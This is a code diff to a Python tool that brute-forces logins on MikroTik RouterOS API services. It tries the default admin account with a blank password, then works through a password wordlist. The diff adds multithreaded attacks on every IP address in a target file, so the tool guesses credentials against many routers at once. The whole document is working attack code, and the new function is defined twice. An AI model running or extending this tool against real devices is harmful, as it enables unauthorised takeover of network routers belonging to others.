@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-#Check for Python3
+#Check for Python
+from queue import Queue
+import concurrent.futures
 import sys
 if sys.version_info < (3, 0):
     sys.stdout.write("Sorry, Python 3.x is required to run this tool\n")
@@ -39,7 +41,7 @@ class RouterOSTrapError(Exception):
     pass
 
 
-banner=('''
+banner=(r'''
         __  __ _ _              _   _ _        _    ____ ___      ____  _____
         |  \/  (_) | ___ __ ___ | |_(_) | __   / \  |  _ \_ _|    | __ )|  ___|
         | |\/| | | |/ / '__/ _ \| __| | |/ /  / _ \ | |_) | |_____|  _ \| |_
@@ -353,6 +355,177 @@ def run(pwd_num):
     print(bar)
     print(status + "\n")
 
+def brute_force_target(target, port, user, dictionary, seconds, autosave_file, quietmode):
+    print(f"[*] Starting bruteforce attack on {target}...")
+    print("-" * 33)
+
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    defcredcheck = True
+
+    count = 0
+    dictFile = codecs.open(dictionary,'rb', encoding='utf-8', errors='ignore')
+    while 1:
+        buffer = dictFile.read(8192*1024)
+        if not buffer: break
+        count += buffer.count('\n')
+    dictFile.seek(0)
+
+    last_password = None
+    if autosave_file and os.path.isfile(autosave_file):
+        print(f"[*] Loading autosave data from file {autosave_file}")
+        with open(autosave_file) as autosave_json:
+            autosave_data = json.load(autosave_json)
+            last_password = autosave_data["last_password"]
+    
+    items = 1
+    for password in dictFile.readlines():
+        password = password.strip('\r\n')
+
+        if last_password:
+            if password != last_password:
+                items += 1
+                continue
+            else:
+                last_password = None
+
+        while defcredcheck:
+            s = None
+            apiros = ApiRos(s, target, "admin", "", port)
+            dictFile.close()
+            defaultcreds = apiros.status
+            login = ''.join(defaultcreds[0][0])
+
+            print("[-] Trying with default credentials on RouterOS...")
+            if login == "!done":
+                print ("[+] Login successful!!! Default RouterOS credentials were not changed. Log in with admin:<BLANK>")
+                return
+            else:
+                print("[-] Default RouterOS credentials were unsuccessful, trying with " + str(count) + " passwords in list...")
+                print("")
+                defcredcheck = False
+                time.sleep(1)
+
+        apiros = ApiRos(s, target, user, password, port)
+        loginoutput = apiros.status
+        login = ''.join(loginoutput[0][0])
+
+        if not quietmode:
+            print("[-] Trying " + str(items) + " of " + str(count) + " Passwords - Current: " + password)
+            apiros.close()
+
+        if login == "!done":
+            print("[+] Login successful!!! User: " + user + " Password: " + password)
+            run(items)
+            return
+        items +=1
+
+        if autosave_file and items % 20 == 0:
+            print(f"[*] Autosaving progress data to file {autosave_file}")
+            with open(autosave_file, "w") as autosave_json:
+                autosave_data = {
+                    "last_password": password
+                }
+                json.dump(autosave_data, autosave_json)
+
+        time.sleep(int(seconds))
+    
+    print()
+    print("[*] ATTACK FINISHED! No suitable credentials were found. Try again with a different wordlist.")
+    run(count)
+
+import signal
+
+def signal_handler(signal, frame):
+    print(" Aborted by user. Exiting... ")
+    sys.exit(2)
+
+def brute_force_target(target, port, user, dictionary, seconds, autosave_file, quietmode):
+    print(f"[*] Starting bruteforce attack on {target}...")
+    print("-" * 33)
+
+    defcredcheck = True
+
+    count = 0
+    dictFile = codecs.open(dictionary,'rb', encoding='utf-8', errors='ignore')
+    while 1:
+        buffer = dictFile.read(8192*1024)
+        if not buffer: break
+        count += buffer.count('\n')
+    dictFile.seek(0)
+
+    last_password = None
+    if autosave_file and os.path.isfile(autosave_file):
+        print(f"[*] Loading autosave data from file {autosave_file}")
+        with open(autosave_file) as autosave_json:
+            autosave_data = json.load(autosave_json)
+            last_password = autosave_data["last_password"]
+    
+    items = 1
+    for password in dictFile.readlines():
+        password = password.strip('\r\n')
+
+        if last_password:
+            if password != last_password:
+                items += 1
+                continue
+            else:
+                last_password = None
+
+        while defcredcheck:
+            s = None
+            apiros = ApiRos(s, target, "admin", "", port)
+            dictFile.close()
+            defaultcreds = apiros.status
+            if len(defaultcreds) > 0 and len(defaultcreds[0]) > 0:
+                login = ''.join(defaultcreds[0][0])
+            else:
+                print("[-] No response or unexpected response format from RouterOS.")
+                defcredcheck = False
+                continue
+
+            print("[-] Trying with default credentials on RouterOS...")
+            if login == "!done":
+                print ("[+] Login successful!!! Default RouterOS credentials were not changed. Log in with admin:<BLANK>")
+                return
+            else:
+                print("[-] Default RouterOS credentials were unsuccessful, trying with " + str(count) + " passwords in list...")
+                print("")
+                defcredcheck = False
+                time.sleep(1)
+
+        apiros = ApiRos(s, target, user, password, port)
+        loginoutput = apiros.status
+        if len(loginoutput) > 0 and len(loginoutput[0]) > 0:
+            login = ''.join(loginoutput[0][0])
+        else:
+            print("[-] No response or unexpected response format from RouterOS.")
+            continue
+
+        if not quietmode:
+            print("[-] Trying " + str(items) + " of " + str(count) + " Passwords - Current: " + password)
+            apiros.close()
+
+        if login == "!done":
+            print("[+] Login successful!!! User: " + user + " Password: " + password)
+            run(items)
+            return
+        items +=1
+
+        if autosave_file and items % 20 == 0:
+            print(f"[*] Autosaving progress data to file {autosave_file}")
+            with open(autosave_file, "w") as autosave_json:
+                autosave_data = {
+                    "last_password": password
+                }
+                json.dump(autosave_data, autosave_json)
+
+        time.sleep(int(seconds))
+    
+    print()
+    print("[*] ATTACK FINISHED! No suitable credentials were found. Try again with a different wordlist.")
+    run(count)
+
 def main():
     print(banner)
     try:
@@ -395,9 +568,6 @@ def main():
             assert False, "error"
             sys.exit(2)
 
-    if not target:
-        error("ERROR: You must specify a Target")
-        sys.exit(2)
     if not dictionary:
         error("ERROR: You must specify a Dictionary")
         sys.exit(2)
@@ -408,93 +578,32 @@ def main():
     if not seconds:
         seconds = 1
 
-    print("[*] Starting bruteforce attack...")
-    print("-" * 33)
-
-    # Catch KeyboardInterrupt
     signal.signal(signal.SIGINT, signal_handler)
-    
-    # Looking for default RouterOS creds
-    defcredcheck = True
 
-    # Get the number of lines in file
-    count = 0
-    dictFile = codecs.open(dictionary,'rb', encoding='utf-8', errors='ignore')
-    while 1:
-        buffer = dictFile.read(8192*1024)
-        if not buffer: break
-        count += buffer.count('\n')
-    dictFile.seek(0)
+    with open('ips.txt', 'r') as f:
+        targets = [line.strip() for line in f.readlines()]
 
-    last_password = None
-    if autosave_file and os.path.isfile(autosave_file):
-      print("[*] Loading autosave data from file %s" % autosave_file)
-      with open(autosave_file) as autosave_json:
-        autosave_data = json.load(autosave_json)
-        last_password = autosave_data["last_password"]
-    
-    # Passwords iteration & socket creation
-    items = 1
-    for password in dictFile.readlines():
-        password = password.strip('\r\n')
+    queue = Queue()
+    for target in targets:
+        queue.put(target)
 
-        # Rewind to autosaved password if it is defined
-        if last_password:
-            if password != last_password:
-                items += 1
-                continue
-            else:
-                last_password = None
+    def worker():
+        while not queue.empty():
+            target = queue.get()
+            try:
+                brute_force_target(target, port, user, dictionary, seconds, autosave_file, quietmode)
+            except Exception as exc:
+                print(f'{target} generated an exception: {exc}')
+            queue.task_done()
 
-        # First of all, we'll try with RouterOS default credentials ("admin":"")
-        while defcredcheck:
-            s = None
-            apiros = ApiRos(s, target, "admin", "", port)
-            dictFile.close()
-            defaultcreds = apiros.status
-            login = ''.join(defaultcreds[0][0])
+    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+        for _ in range(5):
+            executor.submit(worker)
 
-            print("[-] Trying with default credentials on RouterOS...")
-            if login == "!done":
-                print ("[+] Login successful!!! Default RouterOS credentials were not changed. Log in with admin:<BLANK>")
-                sys.exit(0)
-            else:
-                print("[-] Default RouterOS credentials were unsuccessful, trying with " + str(count) + " passwords in list...")
-                print("")
-                defcredcheck = False
-                time.sleep(1)
-
-        apiros = ApiRos(s, target, user, password, port)
-        loginoutput = apiros.status
-        login = ''.join(loginoutput[0][0])
-
-        if not quietmode:
-            print("[-] Trying " + str(items) + " of " + str(count) + " Passwords - Current: " + password)
-            apiros.close()
-
-        if login == "!done":
-            print("[+] Login successful!!! User: " + user + " Password: " + password)
-            run(items)
-            return
-        items +=1
-
-        if autosave_file and items % 20 == 0:
-            print("[*] Autosaving progress data to file %s" % autosave_file)
-            with open(autosave_file, "w") as autosave_json:
-                autosave_data = {
-                    "last_password": password
-                }
-                json.dump(autosave_data, autosave_json)
-
-        time.sleep(int(seconds))
-    
-    print()
-    print("[*] ATTACK FINISHED! No suitable credentials were found. Try again with a different wordlist.")
-    run(count)
+    queue.join()
 
 if __name__ == '__main__':
     t = time.time()
     main()
     sys.exit()
-
 
